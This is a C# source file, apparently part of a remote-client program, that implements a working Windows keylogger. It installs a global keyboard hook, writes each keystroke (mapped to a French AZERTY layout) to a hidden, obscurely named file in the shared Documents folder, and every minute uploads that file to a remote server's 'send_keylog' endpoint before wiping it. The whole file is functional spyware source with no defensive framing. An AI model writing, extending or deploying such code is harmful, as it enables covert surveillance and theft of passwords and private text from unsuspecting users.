using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Web.Script.Serialization;
using System.Windows.Forms;

namespace ClIENT_PC.Controller
{
    //Table Keylogger a la Queuleuleu Max 5 Dernier
    class ClavierloggerController : ControllerBase
    {
        public ClavierloggerController()
        {
            if(Parametre.ClavierLogger)
            {
                Thread th = new Thread(() => Demmarer());
                th.Start();
            }
        }

        public void Demmarer()
        {
            /* TIMER ENVOIE DONNE CLAVIER INTERCEPTER */
            ClavierloggerController._crochetID = ReglerCrochet(_proc);
            System.Timers.Timer temp = new System.Timers.Timer();
            temp.Elapsed += new ElapsedEventHandler(Evenement_Envoie);
            temp.AutoReset = true;
            temp.Interval = 60000 * 1;
            temp.Start();

            Application.Run();

            //NETTOYE LIBERE
            GC.KeepAlive(temp);

            Application.Run();
            UnhookWindowsHookEx(_crochetID);
        }

        private void Evenement_Envoie(object sender, ElapsedEventArgs e)
        {
            string done = string.Empty;
            using (WebClient cl = new WebClient())
            {
                done = Encoding.ASCII.GetString(cl.UploadFile(Router.url("send_keylog"), "POST", cheminlog));
            }

            dynamic data = serializer.DeserializeObject(done);

            string cheminBrut = Convert.ToString(data.chemin);
            File.WriteAllText(cheminlog, string.Empty);
        }

        private const int WH_CLAVIER_LL = 13;
        private const int WM_TOUCHELACHE = 0x0100;
        private static LowLevelKeyboardProc _proc = CrocherDeRappel;
        private static IntPtr _crochetID = IntPtr.Zero;
        //OU METTRE LE FICHIER DES LOGS
        public static string cheminlog = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), "qdQd1532");
        //POUR MAJ SHIFT ET ALT
        public static byte MA_majuscule_J = 0, SH_changement_IFT = 0, alt = 0, manque = 0;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static IntPtr ReglerCrochet(LowLevelKeyboardProc proc)
        {
            using (Process prcs = Process.GetCurrentProcess())
            using (ProcessModule curModule = prcs.MainModule)
            {
                return SetWindowsHookEx(WH_CLAVIER_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr CrocherDeRappel(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_TOUCHELACHE)
            {
                try
                {
                    StreamWriter sw = File.AppendText(cheminlog);
                    File.SetAttributes(cheminlog, File.GetAttributes(cheminlog) | FileAttributes.Hidden);
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (Keys.Shift == Control.ModifierKeys) SH_changement_IFT = 1;
                    if (Keys.Alt == Control.ModifierKeys) alt = 1; 

                    switch ((Keys)vkCode)
                    {
                        case Keys.Space:
                            sw.Write(" ");
                            break;
                        case Keys.Return:
                            sw.WriteLine("" + Environment.NewLine);
                            break;
                        case Keys.Back:
                            sw.Write(" BACK ");
                            break;
                        case Keys.Tab:
                            sw.Write(" TAB ");
                            break;
                        case Keys.D0:
                            if (SH_changement_IFT == 0) sw.Write("à");
                            else if (alt == 1) sw.Write('@');
                            else sw.Write("0");
                            break;
                        case Keys.D1:
                            if (SH_changement_IFT == 0) sw.Write("&");
                            else if (alt == 1) sw.Write('@');
                            else sw.Write("1");
                            break;
                        case Keys.D2:
                            if (SH_changement_IFT == 0) sw.Write("é");
                            else sw.Write("2");
                            break;
                        case Keys.D3:
                            if (SH_changement_IFT == 0) sw.Write("#");
                            else sw.Write("3");
                            break;
                        case Keys.D4:
                            if (SH_changement_IFT == 0) sw.Write("'");
                            else sw.Write("4");
                            break;
                        case Keys.D5:
                            if (SH_changement_IFT == 0) sw.Write("(");
                            else sw.Write("5");
                            break;
                        case Keys.D6:
                            if (SH_changement_IFT == 0) sw.Write("-");
                            else sw.Write("6");
                            break;
                        case Keys.D7:
                            if (SH_changement_IFT == 0) sw.Write("è");
                            else sw.Write("7");
                            break;
                        case Keys.D8:
                            if (SH_changement_IFT == 0) sw.Write("_");
                            else sw.Write("8");
                            break;
                        case Keys.D9:
                            if (SH_changement_IFT == 0) sw.Write("ç");
                            else sw.Write("9");
                            break;
                        case Keys.LShiftKey:
                        case Keys.RShiftKey:
                        case Keys.LControlKey:
                        case Keys.RControlKey:
                        case Keys.LMenu:
                        case Keys.RMenu:
                        case Keys.LWin:
                        case Keys.RWin:
                        case Keys.Apps:
                            break;
                        case Keys.OemQuestion:
                            if (SH_changement_IFT == 0) sw.Write(":");
                            else sw.Write("/");
                            break;
                        case Keys.OemOpenBrackets:
                            if (SH_changement_IFT == 0) sw.Write(")");
                            else sw.Write("°");
                            break;
                        case Keys.OemCloseBrackets:
                            if (SH_changement_IFT == 0) sw.Write("^");
                            else sw.Write("¨");
                            break;
                        case Keys.Oem1:
                            if (SH_changement_IFT == 0) sw.Write("$");
                            else sw.Write("£");
                            break;
                        case Keys.Oem7:
                            if (SH_changement_IFT == 0) sw.Write("²");
                            else sw.Write("");
                            break;
                        case Keys.Oemcomma:
                            if (SH_changement_IFT == 0) sw.Write(",");
                            else sw.Write("?");
                            break;
                        case Keys.OemPeriod:
                            if (SH_changement_IFT == 0) sw.Write(";");
                            else sw.Write(".");
                            break;
                        case Keys.OemBackslash:
                            if (SH_changement_IFT == 0) sw.Write("<");
                            else sw.Write(">");
                            break;
                        case Keys.OemMinus:
                            if (SH_changement_IFT == 0) sw.Write("6");
                            else sw.Write("-");
                            break;
                        case Keys.Oemplus:
                            if (SH_changement_IFT == 0) sw.Write("=");
                            else sw.Write("+");
                            break;
                        case Keys.Oemtilde:
                            if (SH_changement_IFT == 0) sw.Write("ù");
                            else sw.Write("%");
                            break;
                        case Keys.Oem5:
                            if (SH_changement_IFT == 0) sw.Write("*");
                            else sw.Write("µ");
                            break;
                        case Keys.Oem8:
                            if (SH_changement_IFT == 0) sw.Write("!");
                            else sw.Write("§");
                            break;
                        case Keys.Capital:
                            if (MA_majuscule_J == 0) MA_majuscule_J = 1;
                            else MA_majuscule_J = 0;
                            break;
                          
                        default:
                            if (SH_changement_IFT == 0 && MA_majuscule_J == 0) sw.Write(((Keys)vkCode).ToString().ToLower());
                            if (SH_changement_IFT == 1 && MA_majuscule_J == 0) sw.Write(((Keys)vkCode).ToString().ToUpper());
                            if (SH_changement_IFT == 0 && MA_majuscule_J == 1) sw.Write(((Keys)vkCode).ToString().ToUpper());
                            if (SH_changement_IFT == 1 && MA_majuscule_J == 1) sw.Write(((Keys)vkCode).ToString().ToLower());
                            break;
                    }
                    SH_changement_IFT = 0;
                    alt = 0;
                    sw.Close();
                }
                catch { MessageBox.Show("Erreur Write File"); }
            }
            return CallNextHookEx(_crochetID, nCode, wParam, lParam);
        }
    }
}
